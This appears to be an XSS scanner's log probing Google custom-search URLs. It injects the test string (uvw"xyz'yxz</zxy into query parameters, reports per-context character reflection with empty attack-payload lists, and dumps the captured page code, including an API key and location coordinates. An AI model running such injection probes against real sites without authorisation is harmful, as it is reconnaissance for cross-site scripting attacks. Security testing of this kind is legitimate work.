+<a href="/preferences?hl=en&amp;prev=https://www.google.com/search?domains%3Dwww.vibrationdata.com%26q%3D%26sitesearch%3D(uvw%252522xyz%252527yxz%25253C/zxy%26client%3Dpub-1751731975287442%26ie%3DISO-8859-1%26oe%3DISO-8859-1%26safe%3Dactive%26cof%3DGALT:" class="f9UGee" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" data-ved="2ahUKEwi2vPqBruXoAhUMyDgGHcTDDdkQo_oBegQIARAK">
+<a href="/preferences?hl=en&amp;prev=https://www.google.com/search?domains%3Dwww.vibrationdata.com%26q%3D%26sitesearch%3D(uvw%252522xyz%252527yxz%25253C/zxy%26client%3Dpub-1751731975287442%26ie%3DISO-8859-1%26oe%3DISO-8859-1%26safe%3Dactive%26cof%3DGALT:#languages" class="f9UGee" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" data-ved="2ahUKEwi2vPqBruXoAhUMyDgGHcTDDdkQo_oBegQIARAL">
+<a class="f9UGee" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" data-safesearch-on="1" href="/setprefs?safeui=images&amp;sig=0_LrrVPROcDc1ZWlJkOvIMP8HSytE%3D&amp;prev=https://www.google.com/search?domains%3Dwww.vibrationdata.com%26q%3D%26sitesearch%3D(uvw%252522xyz%252527yxz%25253C/zxy%26client%3Dpub-1751731975287442%26ie%3DISO-8859-1%26oe%3DISO-8859-1%26safe%3Dactive%26cof%3DGALT:" id="safesearch" data-ved="2ahUKEwi2vPqBruXoAhUMyDgGHcTDDdkQo_oBegQIARAM">
+<a href="/advanced_search?q=site:(uvw%2522xyz%2527yxz%253C/zxy&amp;safe=active&amp;client=pub-1751731975287442&amp;domains=www.vibrationdata.com&amp;oe=ISO-8859-1&amp;hl=en" class="f9UGee" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" data-ved="2ahUKEwi2vPqBruXoAhUMyDgGHcTDDdkQo_oBegQIARAN">
+<a href="/setprefs?safeui=images&amp;sig=0_LrrVPROcDc1ZWlJkOvIMP8HSytE%3D&amp;prev=https://www.google.com/search?domains%3Dwww.vibrationdata.com%26q%3D%26sitesearch%3D(uvw%252522xyz%252527yxz%25253C/zxy%26client%3Dpub-1751731975287442%26ie%3DISO-8859-1%26oe%3DISO-8859-1%26safe%3Dactive%26cof%3DGALT:">
+<meta content="0;url=/search?q=site:(uvw%2522xyz%2527yxz%253C/zxy&amp;safe=active&amp;client=pub-1751731975287442&amp;domains=www.vibrationdata.com&amp;oe=ISO-8859-1&amp;gbv=1&amp;sei=JVWUXvaVK4yQ4-EPxIe3yA0" http-equiv="refresh">
+
+----------------------------------------------------------------------------------
+
+
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	True	True	False
+
+Attack Payloads for ATTR
+[]
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	True	True	True
+
+Attack Payloads for ATTR
+[]
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	True	True	False
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	True	True	False
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	True	True	False
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+SCRIPT:		True	True	True	True	False
+
+Attack Payloads for SCRIPT
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+_______________________________________________________________________________________________________
+http://www.google.com/custom?domains=www.vibrationdata.com&q=&sitesearch=www.vibrationdata.com&client=(uvw"xyz'yxz</zxy&forid=1&ie=ISO-8859-1&oe=ISO-8859-1&safe=active&cof=GALT:#008000;GL:1;DIV:#336699;VLC:663399;AH:center;BGC:FFFFFF;LBGC:336699;ALC:0000FF;LC:0000FF;T:000000;GFNT:0000FF;GIMP:0000FF;FORID:1;&hl=en
+
+----------------------------------------------------------------------------------
+Attribute Context: [2]
+<input name="client" value='(uvw"xyz&#39;yxz&lt;/zxy' type="hidden">
+<div jsdata="GXYZuf;;ALK6fs" jscontroller="G3eKy" jsl="$t t-w-XilABeKRA;$x 0;" class="r-iMyc3zNzKtJo">
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [1]
+<script nonce="UWXrvcRVw+G6fWNJR+By8w==">(function(){google.ldi={};google.pim={};})();(function(){var u='/xjs/_/js/k\x3dxjs.s.en_GB.YlbWwcv8Rzo.O/ck\x3dxjs.s._psGpbc7COU.L.W.O/m\x3dFkg7bd,HcFEGb,IvlUe,MC8mtf,OF7gzc,RMhBfe,T4BAC,TJw5qb,TbaHGc,Y33vzc,ZyRBae,cdos,hsm,iDPoPb,jsa,mvYTse,tg8oTe,uz938c,vWNDde,ws9Tlc,yQ43ff,d,csi/am\x3dAAQAAMASgF13AJz_TQAAF8w4AAAggBvBxgIpIqEgAAGsuggCAQ/d\x3d1/dg\x3d2/ct\x3dzgms/rs\x3dACT90oGH5qsv6t9wsw0xPVUy40iHVnuuOQ';
+setTimeout(function(){var b=document;var a="SCRIPT";"application/xhtml+xml"===b.contentType&&(a=a.toLowerCase());a=b.createElement(a);a.src=u;google.timers&&google.timers.load&&google.tick&&google.tick("load","xjsls");document.body.appendChild(a)},0);})();(function(){window.google.xjsu='/xjs/_/js/k\x3dxjs.s.en_GB.YlbWwcv8Rzo.O/ck\x3dxjs.s._psGpbc7COU.L.W.O/m\x3dFkg7bd,HcFEGb,IvlUe,MC8mtf,OF7gzc,RMhBfe,T4BAC,TJw5qb,TbaHGc,Y33vzc,ZyRBae,cdos,hsm,iDPoPb,jsa,mvYTse,tg8oTe,uz938c,vWNDde,ws9Tlc,yQ43ff,d,csi/am\x3dAAQAAMASgF13AJz_TQAAF8w4AAAggBvBxgIpIqEgAAGsuggCAQ/d\x3d1/dg\x3d2/ct\x3dzgms/rs\x3dACT90oGH5qsv6t9wsw0xPVUy40iHVnuuOQ';})();function _DumpException(e){throw e;}
+function _F_installCss(c){}
+(function(){google.spjs=false;google.snet=true;google.em=[];google.emw=false;google.pdt=0;google.uwp=false;})();(function(){var pmc='{\x22Fkg7bd\x22:{},\x22HcFEGb\x22:{},\x22IvlUe\x22:{},\x22MC8mtf\x22:{},\x22OF7gzc\x22:{},\x22RMhBfe\x22:{},\x22T4BAC\x22:{},\x22TJw5qb\x22:{},\x22TbaHGc\x22:{},\x22Y33vzc\x22:{},\x22ZyRBae\x22:{},\x22aa\x22:{},\x22abd\x22:{\x22abd\x22:false,\x22deb\x22:false,\x22det\x22:false},\x22async\x22:{},\x22bgd\x22:{\x22ac\x22:true,\x22as\x22:true,\x22at\x22:0,\x22ea\x22:true,\x22ed\x22:0,\x22ei\x22:true,\x22el\x22:true,\x22ep\x22:true,\x22er\x22:true,\x22et\x22:0,\x22eu\x22:false,\x22wl\x22:false},\x22cdos\x22:{\x22cdobsel\x22:false},\x22csi\x22:{},\x22d\x22:{},\x22ddls\x22:{},\x22dvl\x22:{\x22cookie_secure\x22:true,\x22cookie_timeout\x22:86400,\x22driver_ui_type\x22:2,\x22jsc\x22:\x22[null,null,null,30000,null,null,null,2,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[\\\x2286400000\\\x22,\\\x22604800000\\\x22,2.0]\\n,null,1]\\n\x22,\x22mnr_crd\x22:\x221\x22,\x22msg_dsc\x22:\x22From your Internet address\x22,\x22msg_dsc_url\x22:\x22\x22,\x22msg_dvl\x22:\x22From your device\x22,\x22msg_err\x22:\x22Location unavailable\x22,\x22msg_gps\x22:\x22Using GPS\x22,\x22msg_unk\x22:\x22Unknown\x22,\x22msg_upd\x22:\x22Update location\x22,\x22msg_use\x22:\x22Use precise location\x22,\x22uul_text\x22:\x22Lahore\x22},\x22foot\x22:{\x22pf\x22:true,\x22po\x22:true,\x22qe\x22:false},\x22gf\x22:{\x22pid\x22:196},\x22hsm\x22:{},\x22iDPoPb\x22:{},\x22jsa\x22:{\x22csi\x22:true,\x22csir\x22:100},\x22kyn\x22:{},\x22llc\x22:{},\x22lu\x22:{},\x22m\x22:{},\x22mUpTid\x22:{},\x22mpck\x22:{\x22me\x22:false},\x22mu\x22:{\x22murl\x22:\x22https://adservice.google.com/adsid/google/ui\x22},\x22mvYTse\x22:{},\x22sb_wiz\x22:{\x22rfs\x22:[],\x22stok\x22:\x22v9K_j5afygJ_gLSscBGDImsgyLM\x22},\x22sf\x22:{},\x22sonic\x22:{},\x22spch\x22:{\x22ae\x22:\x22Please check your microphone.  \\u003Ca href\x3d\\\x22https://support.google.com/chrome/?p\x3dui_voice_search\\\x22 target\x3d\\\x22_blank\\\x22\\u003ELearn more\\u003C/a\\u003E\x22,\x22hl\x22:\x22en-PK\x22,\x22im\x22:\x22Click \\u003Cb\\u003EAllow\\u003C/b\\u003E to start voice search\x22,\x22iw\x22:\x22Waiting...\x22,\x22lm\x22:\x22Listening...\x22,\x22lu\x22:\x22%1$s voice search not available\x22,\x22mb\x22:false,\x22ne\x22:\x22No Internet connection\x22,\x22nt\x22:\x22Didn\x27t get that. \\u003Cspan\\u003ETry again\\u003C/span\\u003E\x22,\x22nv\x22:\x22Please check your microphone and audio levels.  \\u003Ca href\x3d\\\x22https://support.google.com/chrome/?p\x3dui_voice_search\\\x22 target\x3d\\\x22_blank\\\x22\\u003ELearn more\\u003C/a\\u003E\x22,\x22pe\x22:\x22Voice search has been turned off.  \\u003Ca href\x3d\\\x22https://support.google.com/chrome/?p\x3dui_voice_search\\\x22 target\x3d\\\x22_blank\\\x22\\u003EDetails\\u003C/a\\u003E\x22,\x22rm\x22:\x22Speak now\x22},\x22tg8oTe\x22:{},\x22tl\x22:{\x22rvkey\x22:\x22AIzaSyC_9Rt88UMjzgg5pIVArnfuIVkJx4zCdTY\x22},\x22uz938c\x22:{},\x22vWNDde\x22:{},\x22vs\x22:{},\x22ws9Tlc\x22:{},\x22yQ43ff\x22:{}}';google.pmc=JSON.parse(pmc);})();(function(){var r=['sb_wiz','aa','abd','async','bgd','dvl','foot','kyn','lu','m','mUpTid','mpck','mu','sf','sonic','spch','tl','vs','exdc'];google.plm(r);})();(function(){var m=[[["root",[["t-w-XilABeKRA","iMyc3zNzKtJo","r-iMyc3zNzKtJo",null,null,"exdc"]
+]
+,""]
+]
+]
+;google.jsc&&google.jsc.m(m);google.log('rfl','');})();(function(){var m=['ALK6fk','[\x22psy-ab\x22,\x22gws-wiz\x22,\x22site:www.vibrationdata.com\x22,\x22\x22,null,1,0,0,11,\x22en\x22,\x22v9K_j5afygJ_gLSscBGDImsgyLM\x22,\x22\x22,\x22KlWUXtzFDZeU4-EPh_GJ-Ak\x22,0,\x22en-PK\x22,null,null,null,0,null,null,3,5,null,null,0,-1,0,0,0,\x22\x22,0,0,\x22\x22,null,0,null,0,null,\x22/suggest\x22,0,0,0,0,0]\n','ALK6fo','[0,0,0,[null,null,[[[3,null,null,[null,[[\x22qdr_\x22,1,6]\n,[\x22qdr_h\x22,0,6]\n,[\x22qdr_d\x22,0,6]\n,[\x22qdr_w\x22,0,6]\n,[\x22qdr_m\x22,0,6]\n,[\x22qdr_y\x22,0,6]\n,[\x22cdr_opt\x22,0,1,[1,\x22Custom range...\x22,null,\x22cdr:1,cd_min:x,cd_max:x\x22,\x22\x22,\x22text\x22,\x22\x22,\x22\x22,6,1,[[[\x22q\x22,\x22site:www.vibrationdata.com\x22]\n,[\x22safe\x22,\x22active\x22]\n,[\x22client\x22,\x22(uvw\\\x22xyz\x27yxz\\u003c/zxy\x22]\n,[\x22domains\x22,\x22www.vibrationdata.com\x22]\n,[\x22ie\x22,\x22ISO-8859-1\x22]\n,[\x22oe\x22,\x22ISO-8859-1\x22]\n]\n]\n,\x22cdr_opt\x22,\x225/23/2004\x22,0]\n]\n]\n,0]\n]\n,[3,null,null,[null,[[\x22li_\x22,1,6]\n,[\x22li_1\x22,0,6]\n]\n,1]\n]\n]\n,null,[\x22tbs\x22]\n]\n]\n,null,null,[null,[[\x22/search?q\\u003dsite:www.vibrationdata.com\\u0026safe\\u003dactive\\u0026client\\u003d(uvw%22xyz%27yxz%3C/zxy\\u0026domains\\u003dwww.vibrationdata.com\\u0026oe\\u003dISO-8859-1\\u0026source\\u003dlnms\x22,null,null,\x22All\x22,1,null,1,null,null,\x22WEB\x22,[0,2]\n,null,null,0]\n,[\x22/search?q\\u003dsite:www.vibrationdata.com\\u0026safe\\u003dactive\\u0026client\\u003d(uvw%22xyz%27yxz%3C/zxy\\u0026domains\\u003dwww.vibrationdata.com\\u0026oe\\u003dISO-8859-1\\u0026source\\u003dlnms\\u0026tbm\\u003disch\x22,null,null,\x22Images\x22,0,null,1,null,null,\x22IMAGES\x22,[6,2]\n,null,null,6]\n,[\x22/search?q\\u003dsite:www.vibrationdata.com\\u0026safe\\u003dactive\\u0026client\\u003d(uvw%22xyz%27yxz%3C/zxy\\u0026domains\\u003dwww.vibrationdata.com\\u0026oe\\u003dISO-8859-1\\u0026source\\u003dlnms\\u0026tbm\\u003dnws\x22,null,null,\x22News\x22,0,null,1,null,null,\x22NEWS\x22,[10,2]\n,null,null,10]\n]\n,[[\x22/search?q\\u003dsite:www.vibrationdata.com\\u0026safe\\u003dactive\\u0026client\\u003d(uvw%22xyz%27yxz%3C/zxy\\u0026domains\\u003dwww.vibrationdata.com\\u0026oe\\u003dISO-8859-1\\u0026source\\u003dlnms\\u0026tbm\\u003dvid\x22,null,null,\x22Videos\x22,0,null,1,null,null,\x22VIDEOS\x22,[13,2]\n,null,null,13]\n,[\x22/search?q\\u003dsite:www.vibrationdata.com\\u0026safe\\u003dactive\\u0026client\\u003d(uvw%22xyz%27yxz%3C/zxy\\u0026domains\\u003dwww.vibrationdata.com\\u0026oe\\u003dISO-8859-1\\u0026source\\u003dlnms\\u0026tbm\\u003dbks\x22,null,null,\x22Books\x22,0,null,1,null,null,\x22BOOKS\x22,[2,2]\n,null,null,2]\n,[\x22/search?q\\u003dsite:www.vibrationdata.com\\u0026safe\\u003dactive\\u0026client\\u003d(uvw%22xyz%27yxz%3C/zxy\\u0026domains\\u003dwww.vibrationdata.com\\u0026oe\\u003dISO-8859-1\\u0026source\\u003dlnms\\u0026tbm\\u003dfin\x22,null,null,\x22Finance\x22,0,null,1,null,null,\x22FINANCE\x22,[22,2]\n,null,null,22]\n]\n]\n,null,1]\n','ALK6fs','[0,\x22inline\x22,2,2500,0,0]\n','ALK6fw','[null,null,1,30000,null,null,null,2,null,null,3,null,null,null,null,null,1,null,null,null,null,null,null,[31.506432,74.3473152]\n,null,null,null,null,0,null,null,null,null,null,null,null,0,\x221586779434\x22,null,null,null,null,null,1,null,null,[\x2286400000\x22,\x22604800000\x22,2.0]\n,null,1]\n','ALK6f0','[\x22https://www.google.com.pk/domainless/read?igu\\u003d1\x22,\x22AFz9ztusqEKbfFO3vrHtrRZXkWOmfEtvMQ:1586779434401\x22,3]\n','ALK6f4','[1,null,null,1261,1349,0]\n'];
+var a=m;window.W_jd=window.W_jd||{};for(var b=0;b<a.length;b+=2)window.W_jd[a[b]]=JSON.parse(a[b+1]);})();(function(){window.WIZ_global_data={"Yllh3e":"%.@.1586779434221916,104385047,2667739271]\n","zChJod":"%.@.]\n","pxO4Zd":"0","GWsdKe":"en-PK","SIsrTd":"false","LU5fGb":"false","w2btAe":"%.@.\"\",\"\",\"0\",null,null,null,1]\n","eptZe":"/_/WizRpcUi/","mXOY5d":"%.@.null,1]\n","fyLpDc":"","SsQ4x":"UWXrvcRVw+G6fWNJR+By8w\u003d\u003d","PIn0Ab":"1px solid #DFE1E5","GzC2p":"#fff","MOPyub":"15","QSF9Ec":"","xT28q":"false","in3Ilb":"#222","j9ZYRc":"true","eXPt4e":"400","pxDH4c":"#0f9d58","BwgO5":"16","EqX55c":"652","xDKXr":"false","GTYTQ":"#ffeb3b","fRkoq":"true","UNVSy":"false","JyBo2c":"false","k7G1xb":"15","tyCgpc":"#fff","lLCPB":"true","B0husb":"true","Nk1Bhf":"#4285f4","kkVYtc":"false","JVBnre":"false","X1bUEc":"arial,sans-serif-medium,sans-serif","iryGqc":"2","bVUXme":"25","osNyZ":"1.0","U6xP0":"#4285f4","ToXxme":"#e5e5e5","RJegIe":"#fffff0","ZzVVh":"false","Mlljec":"false","hbfefd":"#1A73E8","S1ZUDf":"true","UnFEre":"16","ymIfqf":"18","FiZWae":"32","BW8dtd":"rgba(248, 248, 248, 1)","tJ4Jdf":"11","wku5sd":"false","KnXmRc":"10","XgWQKd":"true","Dc0uuf":"16","BoqNoc":"20px","I69zkb":"rgba(204,204,204,.25)","y519we":"true","b1KZw":"#fff","AEMHld":"#eeeeee","owXwYb":"#f8f8f8","Na6wt":"#e1e1e1","wB1JTc":"false","xz9C5b":"true","KdGe5c":"false","ekXXzb":"13px","kL6Xwb":"false","hqg9c":"#1878f0","aUt4Tc":"false","iKzRxb":"#5f6368","KVmtZc":"rgba(255,255,255,.3)","tqXjO":"false","eE52Jd":"#5f6368","AQEr7b":"#c6c6c6","AP8pqf":"rgba(0,0,0,.12)","kvKIW":"false","qDYzS":"0 2px 10px 0 rgba(0,0,0,0.2)","QnH6ad":"16","dAFa0e":"false","jIrJIf":"14","v44rSc":"#70757a","L6WyEf":"true","ZMFELd":"false","auaxA":"#222","hWyTvf":"false","fFepd":"-15","Utapxe":"-webkit-","KgXmrd":"true","OqjdAf":"true","EJG4vf":"pointer","OQZvxe":"0 2px 10px 0 rgba(0,0,0,0.2)","RpI44b":"#ebebeb","seVajd":"rgba(0,0,0,.12)","pPtK5":"6","iniaFd":"true","TUhOL":"#fafafa","iDTSkb":"true","zHtpPb":"false","SidP2e":"rgba(248, 248, 248, 0)","EuCkcd":"16","X4yPd":"#1c3aa9","i7mh3e":"16","W445Dc":"20","NvsKMd":"true","wlwuHd":"false","JcUGee":"rgba(0,0,0,.54)","rsd6be":"1","u4NTBb":"40","sPiebd":"false","xFbXr":"rgba(0,102,33,1)","SpZHZd":"true","Sgnmlc":"14px","e2p8ee":"false","umYEvb":"false","eo8dye":"#878787","PYrjqe":"40","PPUcAe":"0px 0px 8px rgba(32, 33, 36, .24)","prFQBe":"#ebebeb","SATNMc":"1px solid #dfe1e5","lVRwic":"false","IvNqzc":"true","abZ6pc":"#f9a825","pDiOce":"false","LACYrf":"false","kVbEH":"false","V6eh7c":"16","R9GQh":"#fff","Tae7A":"true","jg5SCd":"false","g635Ab":"2px","KTkDB":"false","FydCC":"true","D8A8he":"true","PuOePe":"false","A2aVpb":"50","PngPbb":"rgba(0,0,0,.87)","tpLZye":"#fff","JRGsye":"none","rZYUef":"#f5f5f5","y2Hs7d":"false","V0Bluc":"none","YXGVrd":"true","p7BdKe":"true","tqmosb":"#fff","F4ULTd":"true","MiTaT":"#1A73E8","FF58Bf":"true","gjAni":"#3c4043","FYBlgf":"false","rx1dvd":"#f3f3f3","YWHUvb":"18px","X4DPRd":"true","ue6nDb":"Roboto-Medium,Roboto-Regular","imHXAf":"true","HWmJg":"#dcdcdc","OjG6Qc":"#000","LIYDac":"arial,sans-serif","B8Dib":"rgba(0,0,0,.87)","haqSDf":"rgba(0,0,0,.54)","xBx7Dc":"36","tuTJ6d":"#b8b8b8","sBpVac":"rgba(0,0,0,.26)","khoEPb":"#1a0dab","pch72b":"false","a8Umdd":"rgba(153,153,153,.4)","y1HZEd":"false","ppkaeb":"0","mJempe":"13","JpB3Ue":"60","PxA5sf":"rgba(0,0,0,.54)","voc95c":"false","ODgkgd":"#fff","dTMnbc":"false","rWPbFe":"rgba(255,255,255,1)","Rnt1Qc":"false","s6Rzec":"0 16px","oyB9kf":"rgba(0,0,0,.87)","QDXUyc":"#188038","Vzh4p":"0px 7px 6px -5px #DFE1E5","z70S0c":"false","VQfWj":"#c0c0c0","TKn0F":"20px","ruHO7c":"#dd191d","Vdtb3d":"true","WWz0vd":"false","EiEfXb":"#ebebeb","aKuscd":"#AECBFA","MoAfyf":"#fff","S7nbec":"16","eGDqv":"false","aD6AQe":"#757575","gbf9Eb":"58","zhkRO":"%.@.1,1,1,1,1,1,0,0,0,1]\n","xeVOLe":"#689f38","ENmP1c":"rgba(204,204,204,.15)","A5tF3b":"false","ZLr84e":"true","FbN3Qc":"rgba(0,0,0,.87)","uRoR4d":"false","EgTnfe":"true","vhCwfc":"false","lzJv9d":"#fff","gqXETb":"#db4437","T1V3fc":"#f4b400","ConpTc":"false","srQSvc":"true","VbmVYd":"true","LnZAkd":"false","bmQ7Rb":"false","UduJSb":"%.@.\"0 0\",0,0,20,20,\"/images/searchbox/desktop_searchbox_sprites302_hr.png\",\"20px\"]\n","QldWK":"6","iwHJId":"15","oFa0q":"#fafafa","fjc61":"false","SuQiSc":"1.3","K2vQjf":"#f8f8f8","Fcb4A":"#1A73E8","QA73ad":"false","bDOvJc":"false","bmAEG":"#d9d9d9","KD9WYe":"#1A73E8","HjM8R":"#FFF","rRLesf":"0","AYVQWe":"20px","rX9Pnb":"16","h29koe":"32","fQC6Cf":"2px","qmiCId":"true","VXIo7d":"8px","H7aRye":"0px 5px 26px 0px rgba(0, 0, 0, 0.22), 0px 20px 28px 0px rgba(0, 0, 0, 0.30)","KFdH8":"true","buGAI":"16","xvI8we":"#212121","SezQgf":"500","AwPxw":"false","ib0wve":"rgba(153,153,153,.2)","By1ejd":"16","yFVHo":"true","gir54":"0.4","WMBRj":"#009688","q7vEEb":"false","wFGKdc":"false","qj36Ef":"#323232","BdVmgf":"16","VnH1Zb":"normal","bXvyY":"#fff","qkXvHd":"500","o28sBd":"false","cdRSXc":"false","pLhKvc":"0","nMRhJe":"false","o9mzkf":"false","kePaAc":"-4","o07h3e":"0 4px 5px rgba(0,0,0,.16)","BYw9f":"false","NW4nA":"rgba(255,255,255,.7)","IfHuyb":"rgba(0,0,0,.54)","a7rhWc":"false","ZxI7Af":"#fafafa","n1Whrf":"false","zhBJde":"false","z1x4kc":"true","AYXCHc":"false","vIMrp":"true","Ym5Ycb":"false","WyvaRd":"0 1px 1px rgba(0,0,0,.16)","N31mf":"false","klgere":"invert(1) hue-rotate(180deg)","WxHUzd":"true","RZ03Ve":"#5677fc","NIYCKf":"28","WnrBce":"rgba(0,0,0,.1)","Hzi6pf":"#DFE1E5","j0DpSe":"false","SfSmD":"#ebebeb","hgWJ8c":"false"};window.IJ_values=["#fff","rgba(0,102,33,1)","rgba(0,0,0,.87)","rgba(0,0,0,.54)","rgba(255,255,255,1)","rgba(255,255,255,.7)",false,"%.@.\"\",\"\",\"0\",null,null,null,1]\n","0","%.@.null,1]\n","%.@.]\n","UWXrvcRVw+G6fWNJR+By8w\u003d\u003d","%.@.\"0 0\",0,0,20,20,\"/images/searchbox/desktop_searchbox_sprites302_hr.png\",\"20px\"]\n","en-PK",false,"","%.@.1586779434221916,104385047,2667739271]\n",false,"/_/WizRpcUi/"];})();google.x(null, function(){(function(){(function(){google.csct={};google.csct.ps='AOvVaw2F1L2ZWMsDBAIN8po8Ig4P\x26ust\x3d1586865834269360';})();})();(function(){(function(){google.csct.pi=true;})();})();(function(){(function(){
+function f(){for(var c="&cshid="+google.cshid,d=document.querySelectorAll('[href^="/"]'),e=0,b;b=d[e++];){var a=b.getAttribute("href");a.match(/[\?|&](ei|ved)=/)&&-1==a.indexOf("cshid=")&&(-1==a.search("#")?b.setAttribute("href",a+c):(a=a.split("#"),b.setAttribute("href",a[0]+c+"#"+a[1])))}d=document.querySelectorAll("[ping]");for(e=0;b=d[e++];)a=b.getAttribute("ping"),-1==a.indexOf("cshid=")&&b.setAttribute("ping",a+c)};google.csh=google.csh||{};google.csh.ict=function(c){google.cshid&&(c&&window.MutationObserver?google.dclc(function(){(new MutationObserver(f)).observe(document.querySelector("body"),{attributes:!0,childList:!0,subtree:!0,characterData:!0})}):google.dclc(f))};}).call(this);})();(function(){(function(){var umo=false;google.csh.ict(umo);})();})();(function(){window.jsl=window.jsl||{};window.jsl.dh=window.jsl.dh||function(i,c,d){try{var e=document.getElementById(i);if(e){e.innerHTML=c;if(d){d();}}else{if(window.jsl.el){window.jsl.el(new Error('Missing ID.'),{'id':i});}}}catch(e){if(window.jsl.el){window.jsl.el(new Error('jsl.dh'));}}};})();(function(){window.jsl.dh('hdtbMenus','\x3cdiv class\x3d\x22hdtb-mn-cont\x22\x3e\x3cdiv id\x3d\x22XJDHvf\x22\x3e\x3c/div\x3e\x3cdiv class\x3d\x22hdtb-mn-hd\x22 aria-haspopup\x3d\x22true\x22 role\x3d\x22button\x22 tabindex\x3d\x220\x22\x3e\x3cdiv class\x3d\x22mn-hd-txt\x22\x3eAny time\x3c/div\x3e\x3cspan class\x3d\x22mn-dwn-arw\x22\x3e\x3c/span\x3e\x3c/div\x3e\x3cul class\x3d\x22hdtbU hdtb-mn-c\x22\x3e\x3cli class\x3d\x22hdtbItm hdtbSel\x22 id\x3d\x22qdr_\x22 tabindex\x3d\x220\x22\x3eAny time\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_h\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3dsite:www.vibrationdata.com\x26amp;safe\x3dactive\x26amp;client\x3d(uvw%22xyz%27yxz%3C/zxy\x26amp;domains\x3dwww.vibrationdata.com\x26amp;oe\x3dISO-8859-1\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:h\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwjcgo6EruXoAhUXyjgGHYd4Ap8QpwV6BAgLEBY\x22\x3ePast hour\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_d\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3dsite:www.vibrationdata.com\x26amp;safe\x3dactive\x26amp;client\x3d(uvw%22xyz%27yxz%3C/zxy\x26amp;domains\x3dwww.vibrationdata.com\x26amp;oe\x3dISO-8859-1\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:d\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwjcgo6EruXoAhUXyjgGHYd4Ap8QpwV6BAgLEBc\x22\x3ePast 24 hours\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_w\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3dsite:www.vibrationdata.com\x26amp;safe\x3dactive\x26amp;client\x3d(uvw%22xyz%27yxz%3C/zxy\x26amp;domains\x3dwww.vibrationdata.com\x26amp;oe\x3dISO-8859-1\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:w\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwjcgo6EruXoAhUXyjgGHYd4Ap8QpwV6BAgLEBg\x22\x3ePast week\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_m\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3dsite:www.vibrationdata.com\x26amp;safe\x3dactive\x26amp;client\x3d(uvw%22xyz%27yxz%3C/zxy\x26amp;domains\x3dwww.vibrationdata.com\x26amp;oe\x3dISO-8859-1\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:m\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwjcgo6EruXoAhUXyjgGHYd4Ap8QpwV6BAgLEBk\x22\x3ePast month\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_y\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3dsite:www.vibrationdata.com\x26amp;safe\x3dactive\x26amp;client\x3d(uvw%22xyz%27yxz%3C/zxy\x26amp;domains\x3dwww.vibrationdata.com\x26amp;oe\x3dISO-8859-1\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:y\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwjcgo6EruXoAhUXyjgGHYd4Ap8QpwV6BAgLEBo\x22\x3ePast year\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22vjyzWd\x22\x3e\x3cdiv jscontroller\x3d\x22Uuupec\x22 data-m\x3d\x22true\x22\x3e\x3cspan class\x3d\x22q\x22 id\x3d\x22cdrlnk\x22 tabindex\x3d\x220\x22 jsaction\x3d\x22EEGHee\x22 